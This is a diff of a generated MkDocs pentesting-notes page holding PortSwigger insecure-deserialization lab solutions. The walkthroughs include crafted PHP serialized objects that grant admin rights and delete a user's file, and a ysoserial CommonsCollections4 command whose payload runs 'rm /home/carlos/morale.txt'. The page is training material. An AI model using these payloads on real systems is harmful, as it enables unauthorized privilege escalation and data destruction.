@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17646,15 +17669,22 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="solution">Solution</h3>
 <p><img alt="Insecure deserialization" src="../../img/indes_01.png" /></p>
 <p><img alt="Insecure deserialization" src="../../img/indes_02.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a># Burp solution
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>1. Log in using your own credentials. Notice that the post-login `GET /my-account` request contains a session cookie that appears to be URL and Base64-encoded.
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>2. Use Burp&#39;s Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The `admin` attribute contains `b:0`, indicating the boolean value `false`. Send this request to Burp Repeater.
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>3. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the `admin` attribute to `b:1`. Click &quot;Apply changes&quot;. The modified object will automatically be re-encoded and updated in the request.
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>4. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have accessed the page with admin privileges.
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>5. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>6. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span>
+<span class="normal"><a href="#__codelineno-0-4">4</a></span>
+<span class="normal"><a href="#__codelineno-0-5">5</a></span>
+<span class="normal"><a href="#__codelineno-0-6">6</a></span>
+<span class="normal"><a href="#__codelineno-0-7">7</a></span>
+<span class="normal"><a href="#__codelineno-0-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a># Burp solution
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>1. Log in using your own credentials. Notice that the post-login `GET /my-account` request contains a session cookie that appears to be URL and Base64-encoded.
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>2. Use Burp&#39;s Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The `admin` attribute contains `b:0`, indicating the boolean value `false`. Send this request to Burp Repeater.
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>3. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the `admin` attribute to `b:1`. Click &quot;Apply changes&quot;. The modified object will automatically be re-encoded and updated in the request.
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>4. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have accessed the page with admin privileges.
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>5. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>6. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.
+</span></code></pre></div></td></tr></table></div>
 <h2 id="modifying-serialized-data-types">Modifying serialized data types</h2>
 <p>PRACTITIONER <a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types">Modifying serialized data types</a></p>
 <h3 id="enunciation_1">Enunciation</h3>
@@ -17663,12 +17693,12 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="solution_1">Solution</h3>
 <p>Capture the Cookie session of the regular user wiener:peter. Send a request containing the cookie to Repeater module. Use the inspector to modify the value of the cookie:</p>
 <p>Original values:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;bzz9fbv8uzas714errnha1q5ppbzyf5h&quot;;}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;bzz9fbv8uzas714errnha1q5ppbzyf5h&quot;;}
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Insecure deserialization" src="../../img/indes_03.png" /></p>
 <p>Crafted values:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;}
+</span></code></pre></div></td></tr></table></div>
 <p>What we did:</p>
 <ul>
 <li>Update the length of the <code>username</code> attribute to <code>13</code>.</li>
@@ -17677,23 +17707,38 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li>Update the data type label for the access token by replacing <code>s</code> with <code>i</code>.</li>
 </ul>
 <p><img alt="Insecure deserialization" src="../../img/indes_04.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># Burp solution
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>1. Log in using your own credentials. In Burp, open the post-login `GET /my-account` request and examine the session cookie using the Inspector to reveal a serialized PHP object. Send this request to Burp Repeater.
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>2. In Burp Repeater, use the Inspector panel to modify the session cookie as follows:
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>    - Update the length of the `username` attribute to `13`.
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    - Change the username to `administrator`.
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    - Change the access token to the integer `0`. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    - Update the data type label for the access token by replacing `s` with `i`.
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>    The result should look like this:
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>    `O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;}`
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>3. Click &quot;Apply changes&quot;. The modified object will automatically be re-encoded and updated in the request.
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>4. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have successfully accessed the page as the `administrator` user.
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>5. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.
-</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>6. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a># Burp solution
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>1. Log in using your own credentials. In Burp, open the post-login `GET /my-account` request and examine the session cookie using the Inspector to reveal a serialized PHP object. Send this request to Burp Repeater.
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>2. In Burp Repeater, use the Inspector panel to modify the session cookie as follows:
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>    - Update the length of the `username` attribute to `13`.
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>    - Change the username to `administrator`.
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>    - Change the access token to the integer `0`. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>    - Update the data type label for the access token by replacing `s` with `i`.
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a>    The result should look like this:
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a>    `O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;}`
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a>3. Click &quot;Apply changes&quot;. The modified object will automatically be re-encoded and updated in the request.
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a>4. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have successfully accessed the page as the `administrator` user.
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>5. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a>6. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.
+</span></code></pre></div></td></tr></table></div>
 <h2 id="using-application-functionality-to-exploit-insecure-deserialization">Using application functionality to exploit insecure deserialization</h2>
 <p>PRACTITIONER <a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization">Using application functionality to exploit insecure deserialization</a></p>
 <h3 id="enunciation_2">Enunciation</h3>
@@ -17705,16 +17750,24 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><img alt="Insecure deserialization" src="../../img/indes_05.png" /></p>
 <p>Exploit would be changing the path to a file that we want to remove and update the string length of the path.</p>
 <p><img alt="Insecure deserialization" src="../../img/indes_06.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># Burp solution
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>1. Log in to your own account. On the &quot;My account&quot; page, notice the option to delete your account by sending a `POST` request to `/my-account/delete`.
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>2. Send a request containing a session cookie to Burp Repeater.
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>3. In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an `avatar_link` attribute, which contains the file path to your avatar.
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>4. Edit the serialized data so that the `avatar_link` points to `/home/carlos/morale.txt`. Remember to update the length indicator. The modified attribute should look like this:
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    `s:11:&quot;avatar_link&quot;;s:23:&quot;/home/carlos/morale.txt&quot;`
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>5. Click &quot;Apply changes&quot;. The modified object will automatically be re-encoded and updated in the request.
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>6. Change the request line to `POST /my-account/delete` and send the request. Your account will be deleted, along with Carlos&#39;s `morale.txt` file.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span>
+<span class="normal"><a href="#__codelineno-4-5">5</a></span>
+<span class="normal"><a href="#__codelineno-4-6">6</a></span>
+<span class="normal"><a href="#__codelineno-4-7">7</a></span>
+<span class="normal"><a href="#__codelineno-4-8">8</a></span>
+<span class="normal"><a href="#__codelineno-4-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a># Burp solution
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>1. Log in to your own account. On the &quot;My account&quot; page, notice the option to delete your account by sending a `POST` request to `/my-account/delete`.
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>2. Send a request containing a session cookie to Burp Repeater.
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>3. In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an `avatar_link` attribute, which contains the file path to your avatar.
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>4. Edit the serialized data so that the `avatar_link` points to `/home/carlos/morale.txt`. Remember to update the length indicator. The modified attribute should look like this:
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>    `s:11:&quot;avatar_link&quot;;s:23:&quot;/home/carlos/morale.txt&quot;`
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>5. Click &quot;Apply changes&quot;. The modified object will automatically be re-encoded and updated in the request.
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>6. Change the request line to `POST /my-account/delete` and send the request. Your account will be deleted, along with Carlos&#39;s `morale.txt` file.
+</span></code></pre></div></td></tr></table></div>
 <h2 id="arbitrary-object-injection-in-php">Arbitrary object injection in PHP</h2>
 <p>PRACTITIONER <a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php">Arbitrary object injection in PHP</a></p>
 <h3 id="enunciation_3">Enunciation</h3>
@@ -17729,23 +17782,34 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>The cookie session consisted on a serialized object. </p>
 <p><img alt="Insecure deserialization" src="../../img/indes_09.png" /></p>
 <p>We will craft a seriealized object that triggers the interested method allocated in CustomTemplate.php and pass it base-64 encoded via the Inspector module:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>O:14:&quot;CustomTemplate&quot;:1:{s:14:&quot;lock_file_path&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>O:14:&quot;CustomTemplate&quot;:1:{s:14:&quot;lock_file_path&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Insecure deserialization" src="../../img/indes_10.png" /></p>
 <p>Run the request!</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a># Burp solution
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>1. Log in to your own account and notice the session cookie contains a serialized PHP object.
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>2. From the site map, notice that the website references the file `/libs/CustomTemplate.php`. Right-click on the file and select &quot;Send to Repeater&quot;.
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>3. In Burp Repeater, notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>    `O:14:&quot;CustomTemplate&quot;:1:{s:14:&quot;lock_file_path&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}`
-</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>6. Base64 and URL-encode this object and save it to your clipboard.
-</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>7. Send a request containing the session cookie to Burp Repeater.
-</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>8. In Burp Repeater, replace the session cookie with the modified one in your clipboard.
-</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>9. Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos&#39;s file.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-6-10">10</a></span>
+<span class="normal"><a href="#__codelineno-6-11">11</a></span>
+<span class="normal"><a href="#__codelineno-6-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a># Burp solution
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>1. Log in to your own account and notice the session cookie contains a serialized PHP object.
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>2. From the site map, notice that the website references the file `/libs/CustomTemplate.php`. Right-click on the file and select &quot;Send to Repeater&quot;.
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>3. In Burp Repeater, notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>    `O:14:&quot;CustomTemplate&quot;:1:{s:14:&quot;lock_file_path&quot;;s:23:&quot;/home/carlos/morale.txt&quot;;}`
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a>6. Base64 and URL-encode this object and save it to your clipboard.
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10"></a>7. Send a request containing the session cookie to Burp Repeater.
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11"></a>8. In Burp Repeater, replace the session cookie with the modified one in your clipboard.
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12"></a>9. Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos&#39;s file.
+</span></code></pre></div></td></tr></table></div>
 <h2 id="exploiting-java-deserialization-with-apache-commons">Exploiting Java deserialization with Apache Commons</h2>
 <p>PRACTITIONER <a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons">Exploiting Java deserialization with Apache Commons</a></p>
 <h3 id="enunciation_4">Enunciation</h3>
@@ -17763,27 +17827,41 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p><img alt="Insecure deserialization" src="../../img/indes_13.png" /></p>
 <p>Now we can craft a payload using <a href="../../ysoserial/">ysoserial tool</a> (see debugging and installation there).</p>
 <p>As we have a java version 11, our payload will be:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>java -jar ysoserial-all.jar CommonsCollections4 &quot;rm /home/carlos/morale.txt&quot; | base64 -w 0 &gt; test.txt
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a># -w 0 : it will remove the end of lines.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>java -jar ysoserial-all.jar CommonsCollections4 &quot;rm /home/carlos/morale.txt&quot; | base64 -w 0 &gt; test.txt
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a># -w 0 : it will remove the end of lines.
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Insecure deserialization" src="../../img/indes_14.png" /></p>
 <p>Now, we copy paste that value in the Cookie session, then we select it and with CTRL-u, we url-encode it (the key characters). Then we send the request.</p>
 <p><img alt="Insecure deserialization" src="../../img/indes_15.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a># Burp solution
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>1. Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>2. Download the &quot;ysoserial&quot; tool and execute the following command. This generates a Base64-encoded serialized object containing your payload:
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>    - In Java versions 16 and above:
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>        `java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 &#39;rm /home/carlos/morale.txt&#39; | base64`
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>    - In Java versions 15 and below:
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
-</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>        `java -jar ysoserial-all.jar CommonsCollections4 &#39;rm /home/carlos/morale.txt&#39; | base64`
-</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.
-</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>4. Send the request to solve the lab.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
